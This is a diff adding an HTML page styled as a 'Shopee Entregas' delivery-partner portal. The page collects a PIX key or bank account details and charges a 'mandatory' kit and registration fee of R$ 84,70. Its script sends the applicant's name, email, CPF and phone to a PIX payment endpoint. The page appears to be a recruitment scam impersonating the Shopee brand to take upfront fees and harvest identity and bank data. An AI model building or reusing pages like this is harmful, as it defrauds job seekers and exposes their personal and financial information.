@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dados de Pagamento - Shopee Entregas</title>
+  <style>
+    :root {
+      --primary-color: #ee4d2d;
+      --primary-dark: #d03a1b;
+      --secondary-color: #0066cc;
+      --text-color: #333;
+      --light-bg: #f8f9fa;
+      --border-radius: 8px;
+      --card-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      --transition: all 0.3s ease;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      line-height: 1.6;
+      color: var(--text-color);
+      background-color: var(--light-bg);
+    }
+    
+    header {
+      background-color: var(--primary-color);
+      padding: 1.5rem 1rem;
+      color: white;
+      text-align: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    header h1 {
+      margin: 0;
+      font-size: 1.8rem;
+    }
+    
+    header p {
+      margin: 0.25rem 0 0;
+      font-size: 1rem;
+      opacity: 0.9;
+    }
+    
+    main {
+      max-width: 800px;
+      margin: 2rem auto;
+      padding: 1rem;
+    }
+    
+    .breadcrumb {
+      display: flex;
+      margin-bottom: 1.5rem;
+      font-size: 0.9rem;
+    }
+    
+    .breadcrumb a {
+      color: var(--secondary-color);
+      text-decoration: none;
+    }
+    
+    .breadcrumb span {
+      margin: 0 0.5rem;
+      color: #999;
+    }
+    
+    .container {
+      background-color: white;
+      border-radius: var(--border-radius);
+      padding: 2rem;
+      box-shadow: var(--card-shadow);
+    }
+    
+    .page-header {
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+    
+    .page-header h2 {
+      color: var(--primary-color);
+      margin-bottom: 0.5rem;
+    }
+    
+    .page-header p {
+      color: #666;
+    }
+    
+    .payment-methods {
+      margin-bottom: 2rem;
+    }
+    
+    .payment-methods-title {
+      margin-bottom: 1rem;
+      font-size: 1.1rem;
+    }
+    
+    .payment-options {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+    }
+    
+    .payment-option {
+      flex: 1;
+      min-width: 200px;
+      border: 2px solid #ddd;
+      border-radius: var(--border-radius);
+      padding: 1.5rem;
+      text-align: center;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+    
+    .payment-option.selected {
+      border-color: var(--primary-color);
+      background-color: rgba(238, 77, 45, 0.05);
+    }
+    
+    .payment-option img {
+      height: 40px;
+      margin-bottom: 1rem;
+      object-fit: contain;
+    }
+    
+    .payment-option h4 {
+      margin-bottom: 0.5rem;
+      color: var(--text-color);
+    }
+    
+    .payment-option p {
+      font-size: 0.9rem;
+      color: #666;
+    }
+    
+    .payment-forms-container {
+      margin-top: 2rem;
+    }
+    
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+    
+    .form-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+    }
+    
+    .form-group input,
+    .form-group select {
+      width: 100%;
+      padding: 0.8rem;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 1rem;
+    }
+    
+    .form-group input:focus,
+    .form-group select:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 3px rgba(238, 77, 45, 0.1);
+    }
+    
+    .form-group .error {
+      color: red;
+      font-size: 0.85rem;
+      margin-top: 0.5rem;
+    }
+    
+    .form-row {
+      display: flex;
+      gap: 1rem;
+    }
+    
+    .form-row .form-group {
+      flex: 1;
+    }
+    
+    .form-hint {
+      color: #666;
+      font-size: 0.85rem;
+      margin-top: 0.5rem;
+    }
+    
+    .payment-form {
+      display: none;
+    }
+    
+    .payment-form.active {
+      display: block;
+      animation: fadeIn 0.3s;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .kit-container {
+      margin-top: 3rem;
+      border-top: 1px solid #eee;
+      padding-top: 2rem;
+    }
+    
+    .kit-header {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin-bottom: 1.5rem;
+    }
+    
+    .kit-header img {
+      width: 80px;
+      height: 80px;
+      object-fit: cover;
+      border-radius: var(--border-radius);
+    }
+    
+    .kit-details h3 {
+      color: var(--primary-color);
+      margin-bottom: 0.3rem;
+    }
+    
+    .kit-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 1rem 0;
+      border-bottom: 1px solid #eee;
+    }
+    
+    .kit-row:last-child {
+      border-bottom: none;
+      font-weight: bold;
+    }
+    
+    .form-actions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 2rem;
+    }
+    
+    .btn {
+      padding: 0.8rem 1.5rem;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: var(--transition);
+      font-size: 1rem;
+    }
+    
+    .btn-primary {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: var(--primary-dark);
+    }
+    
+    .btn-secondary {
+      background-color: #f1f1f1;
+      border: none;
+      color: #333;
+    }
+    
+    .btn-secondary:hover {
+      background-color: #e1e1e1;
+    }
+    
+    footer {
+      background-color: #333;
+      color: white;
+      padding: 2rem 1rem;
+      text-align: center;
+      margin-top: 3rem;
+    }
+    
+    footer p {
+      margin-bottom: 1rem;
+    }
+    
+    .footer-links {
+      margin-bottom: 1rem;
+    }
+    
+    .footer-links a {
+      color: #ddd;
+      margin: 0 0.5rem;
+      text-decoration: none;
+    }
+    
+    .footer-links a:hover {
+      color: white;
+      text-decoration: underline;
+    }
+    
+    @media (max-width: 768px) {
+      .payment-option {
+        flex: none;
+        width: 100%;
+      }
+      
+      .form-row {
+        flex-direction: column;
+        gap: 0;
+      }
+      
+      .form-actions {
+        flex-direction: column;
+        gap: 1rem;
+      }
+      
+      .btn {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Shopee Entregas</h1>
+    <p>Portal do Entregador Parceiro</p>
+  </header>
+  
+  <main>
+    <div class="breadcrumb">
+      <a href="/">Home</a>
+      <span>/</span>
+      <a href="/cadastro">Cadastro</a>
+      <span>/</span>
+      <a href="/municipios">Municípios</a>
+      <span>/</span>
+      <strong>Dados de Pagamento</strong>
+    </div>
+    
+    <div class="container">
+      <div class="page-header">
+        <h2>Dados para Recebimento</h2>
+        <p>Escolha como quer receber seus pagamentos e adquira o kit de entregador</p>
+      </div>
+      
+      <div class="payment-methods">
+        <h3 class="payment-methods-title">Método de Pagamento</h3>
+        <div class="payment-options">
+          <div class="payment-option" data-value="pix" id="option-pix">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Pix_logo.svg/1200px-Pix_logo.svg.png" alt="PIX">
+            <h4>PIX</h4>
+            <p>Receba seus pagamentos via PIX</p>
+          </div>
+          
+          <div class="payment-option" data-value="ted" id="option-ted">
+            <img src="https://i.imgur.com/NXZOnFv.png" alt="Transferência Bancária">
+            <h4>Transferência Bancária</h4>
+            <p>Receba via TED em sua conta bancária</p>
+          </div>
+        </div>
+        <input type="hidden" id="metodo-pagamento" value="">
+      </div>
+      
+      <div class="payment-forms-container">
+        <!-- Formulário PIX -->
+        <form id="pix-form" class="payment-form">
+          <div class="form-group">
+            <label for="pix-chave">Chave PIX</label>
+            <input type="text" id="pix-chave" name="pix-chave" required>
+            <div class="form-hint">Pode ser CPF, e-mail, telefone ou chave aleatória</div>
+            <div class="error" id="pix-chave-error"></div>
+          </div>
+          
+          <div class="form-group">
+            <label for="pix-tipo">Tipo de Chave</label>
+            <select id="pix-tipo" name="pix-tipo" required>
+              <option value="">Selecione o tipo de chave</option>
+              <option value="cpf">CPF</option>
+              <option value="email">E-mail</option>
+              <option value="telefone">Telefone</option>
+              <option value="aleatoria">Chave Aleatória</option>
+            </select>
+            <div class="error" id="pix-tipo-error"></div>
+          </div>
+        </form>
+        
+        <!-- Formulário Transferência Bancária -->
+        <form id="ted-form" class="payment-form">
+          <div class="form-row">
+            <div class="form-group">
+              <label for="ted-banco">Banco</label>
+              <select id="ted-banco" name="ted-banco" required>
+                <option value="">Selecione o banco</option>
+                <option value="001">Banco do Brasil</option>
+                <option value="104">Caixa Econômica Federal</option>
+                <option value="033">Santander</option>
+                <option value="341">Itaú</option>
+                <option value="237">Bradesco</option>
+                <option value="260">Nubank</option>
+                <option value="077">Inter</option>
+                <option value="336">C6 Bank</option>
+                <option value="212">Banco Original</option>
+                <option value="756">Sicoob</option>
+              </select>
+              <div class="error" id="ted-banco-error"></div>
+            </div>
+            
+            <div class="form-group">
+              <label for="ted-agencia">Agência</label>
+              <input type="text" id="ted-agencia" name="ted-agencia" placeholder="Sem dígito" required>
+              <div class="error" id="ted-agencia-error"></div>
+            </div>
+          </div>
+          
+          <div class="form-row">
+            <div class="form-group">
+              <label for="ted-conta">Conta</label>
+              <input type="text" id="ted-conta" name="ted-conta" placeholder="Sem dígito" required>
+              <div class="error" id="ted-conta-error"></div>
+            </div>
+            
+            <div class="form-group">
+              <label for="ted-digito">Dígito</label>
+              <input type="text" id="ted-digito" name="ted-digito" maxlength="1" required>
+              <div class="error" id="ted-digito-error"></div>
+            </div>
+          </div>
+          
+          <div class="form-group">
+            <label for="ted-tipo-conta">Tipo de Conta</label>
+            <select id="ted-tipo-conta" name="ted-tipo-conta" required>
+              <option value="">Selecione o tipo de conta</option>
+              <option value="corrente">Conta Corrente</option>
+              <option value="poupanca">Conta Poupança</option>
+              <option value="pagamento">Conta de Pagamento</option>
+            </select>
+            <div class="error" id="ted-tipo-conta-error"></div>
+          </div>
+        </form>
+      </div>
+      
+      <div class="kit-container">
+        <div class="kit-header">
+          <img src="https://i.imgur.com/C3pLCRd.jpg" alt="Kit de Entregador">
+          <div class="kit-details">
+            <h3>Kit de Entregador Shopee</h3>
+            <p>Equipamentos obrigatórios para iniciar suas entregas</p>
+          </div>
+        </div>
+        
+        <div class="kit-row">
+          <div>Mochila Térmica Shopee</div>
+          <div>R$ 59,90</div>
+        </div>
+        
+        <div class="kit-row">
+          <div>Camiseta Oficial (2 unid.)</div>
+          <div>R$ 19,80</div>
+        </div>
+        
+        <div class="kit-row">
+          <div>Taxa de Cadastro</div>
+          <div>R$ 5,00</div>
+        </div>
+        
+        <div class="kit-row">
+          <div>Total</div>
+          <div id="kit-total">R$ 84,70</div>
+        </div>
+      </div>
+      
+      <div class="form-actions">
+        <button type="button" class="btn btn-secondary" id="btn-voltar">Voltar</button>
+        <button type="button" class="btn btn-primary" id="btn-continuar">Continuar</button>
+      </div>
+    </div>
+  </main>
+  
+  <footer>
+    <p>&copy; 2025 Shopee Entregas. Todos os direitos reservados.</p>
+    <div class="footer-links">
+      <a href="#">Termos de Uso</a>
+      <a href="#">Política de Privacidade</a>
+      <a href="#">Contato</a>
+    </div>
+  </footer>
+
+  <script>
+    // Elementos do DOM
+    const metodoPagamentoInput = document.getElementById('metodo-pagamento');
+    const optionPix = document.getElementById('option-pix');
+    const optionTed = document.getElementById('option-ted');
+    const pixForm = document.getElementById('pix-form');
+    const tedForm = document.getElementById('ted-form');
+    const btnVoltar = document.getElementById('btn-voltar');
+    const btnContinuar = document.getElementById('btn-continuar');
+    
+    // Manipular seleção de método de pagamento
+    optionPix.addEventListener('click', () => {
+      optionPix.classList.add('selected');
+      optionTed.classList.remove('selected');
+      metodoPagamentoInput.value = 'pix';
+      
+      pixForm.classList.add('active');
+      tedForm.classList.remove('active');
+    });
+    
+    optionTed.addEventListener('click', () => {
+      optionTed.classList.add('selected');
+      optionPix.classList.remove('selected');
+      metodoPagamentoInput.value = 'ted';
+      
+      tedForm.classList.add('active');
+      pixForm.classList.remove('active');
+    });
+    
+    // Validar formulário PIX
+    function validatePixForm() {
+      let isValid = true;
+      
+      const pixChave = document.getElementById('pix-chave').value.trim();
+      const pixTipo = document.getElementById('pix-tipo').value;
+      
+      // Validar chave
+      if (!pixChave) {
+        document.getElementById('pix-chave-error').textContent = 'Chave PIX é obrigatória';
+        isValid = false;
+      } else {
+        document.getElementById('pix-chave-error').textContent = '';
+      }
+      
+      // Validar tipo
+      if (!pixTipo) {
+        document.getElementById('pix-tipo-error').textContent = 'Selecione o tipo de chave';
+        isValid = false;
+      } else {
+        document.getElementById('pix-tipo-error').textContent = '';
+      }
+      
+      return isValid;
+    }
+    
+    // Validar formulário TED
+    function validateTedForm() {
+      let isValid = true;
+      
+      const tedBanco = document.getElementById('ted-banco').value;
+      const tedAgencia = document.getElementById('ted-agencia').value.trim();
+      const tedConta = document.getElementById('ted-conta').value.trim();
+      const tedDigito = document.getElementById('ted-digito').value.trim();
+      const tedTipoConta = document.getElementById('ted-tipo-conta').value;
+      
+      // Validar banco
+      if (!tedBanco) {
+        document.getElementById('ted-banco-error').textContent = 'Selecione o banco';
+        isValid = false;
+      } else {
+        document.getElementById('ted-banco-error').textContent = '';
+      }
+      
+      // Validar agência
+      if (!tedAgencia) {
+        document.getElementById('ted-agencia-error').textContent = 'Agência é obrigatória';
+        isValid = false;
+      } else if (!/^\d+$/.test(tedAgencia)) {
+        document.getElementById('ted-agencia-error').textContent = 'Agência deve conter apenas números';
+        isValid = false;
+      } else {
+        document.getElementById('ted-agencia-error').textContent = '';
+      }
+      
+      // Validar conta
+      if (!tedConta) {
+        document.getElementById('ted-conta-error').textContent = 'Conta é obrigatória';
+        isValid = false;
+      } else if (!/^\d+$/.test(tedConta)) {
+        document.getElementById('ted-conta-error').textContent = 'Conta deve conter apenas números';
+        isValid = false;
+      } else {
+        document.getElementById('ted-conta-error').textContent = '';
+      }
+      
+      // Validar dígito
+      if (!tedDigito) {
+        document.getElementById('ted-digito-error').textContent = 'Dígito é obrigatório';
+        isValid = false;
+      } else if (!/^[\dXx]$/.test(tedDigito)) {
+        document.getElementById('ted-digito-error').textContent = 'Dígito inválido';
+        isValid = false;
+      } else {
+        document.getElementById('ted-digito-error').textContent = '';
+      }
+      
+      // Validar tipo de conta
+      if (!tedTipoConta) {
+        document.getElementById('ted-tipo-conta-error').textContent = 'Selecione o tipo de conta';
+        isValid = false;
+      } else {
+        document.getElementById('ted-tipo-conta-error').textContent = '';
+      }
+      
+      return isValid;
+    }
+    
+    // Validar formulário
+    function validateForm() {
+      const metodoPagamento = metodoPagamentoInput.value;
+      
+      if (!metodoPagamento) {
+        alert('Por favor, selecione um método de pagamento');
+        return false;
+      }
+      
+      if (metodoPagamento === 'pix') {
+        return validatePixForm();
+      } else if (metodoPagamento === 'ted') {
+        return validateTedForm();
+      }
+      
+      return false;
+    }
+    
+    // Botão voltar
+    btnVoltar.addEventListener('click', () => {
+      window.location.href = '/municipios';
+    });
+    
+    // Botão continuar
+    btnContinuar.addEventListener('click', () => {
+      if (validateForm()) {
+        // Salvar dados no localStorage
+        const paymentData = {
+          metodo: metodoPagamentoInput.value
+        };
+        
+        if (paymentData.metodo === 'pix') {
+          paymentData.pixChave = document.getElementById('pix-chave').value.trim();
+          paymentData.pixTipo = document.getElementById('pix-tipo').value;
+        } else if (paymentData.metodo === 'ted') {
+          paymentData.tedBanco = document.getElementById('ted-banco').value;
+          paymentData.tedAgencia = document.getElementById('ted-agencia').value.trim();
+          paymentData.tedConta = document.getElementById('ted-conta').value.trim();
+          paymentData.tedDigito = document.getElementById('ted-digito').value.trim();
+          paymentData.tedTipoConta = document.getElementById('ted-tipo-conta').value;
+        }
+        
+        localStorage.setItem('paymentData', JSON.stringify(paymentData));
+        
+        // Fazer a chamada API para criar o pagamento
+        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+        
+        // Dados para a API
+        const paymentRequest = {
+          name: userData.nome || '',
+          email: userData.email || '',
+          cpf: userData.cpf?.replace(/\D/g, '') || '',
+          phone: userData.telefone?.replace(/\D/g, '') || '',
+          amount: 84.70
+        };
+        
+        // Chamar a API
+        fetch('/api/payments/pix-python', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(paymentRequest)
+        })
+          .then(response => response.json())
+          .then(data => {
+            // Salvar os dados do pagamento
+            localStorage.setItem('pixPayment', JSON.stringify(data));
+            
+            // Redirecionar para a página de finalização
+            window.location.href = '/entrega';
+          })
+          .catch(error => {
+            console.error('Erro ao processar pagamento:', error);
+            alert('Erro ao processar pagamento. Por favor, tente novamente mais tarde.');
+          });
+      }
+    });
+    
+    // Carregar dados salvos
+    function loadStoredData() {
+      const paymentData = localStorage.getItem('paymentData');
+      
+      if (paymentData) {
+        const data = JSON.parse(paymentData);
+        
+        if (data.metodo === 'pix') {
+          optionPix.click();
+          document.getElementById('pix-chave').value = data.pixChave || '';
+          document.getElementById('pix-tipo').value = data.pixTipo || '';
+        } else if (data.metodo === 'ted') {
+          optionTed.click();
+          document.getElementById('ted-banco').value = data.tedBanco || '';
+          document.getElementById('ted-agencia').value = data.tedAgencia || '';
+          document.getElementById('ted-conta').value = data.tedConta || '';
+          document.getElementById('ted-digito').value = data.tedDigito || '';
+          document.getElementById('ted-tipo-conta').value = data.tedTipoConta || '';
+        }
+      } else {
+        // Por padrão, selecionar PIX
+        optionPix.click();
+      }
+    }
+    
+    // Inicializar página
+    document.addEventListener('DOMContentLoaded', () => {
+      loadStoredData();
+    });
+  </script>
+</body>
+</html>
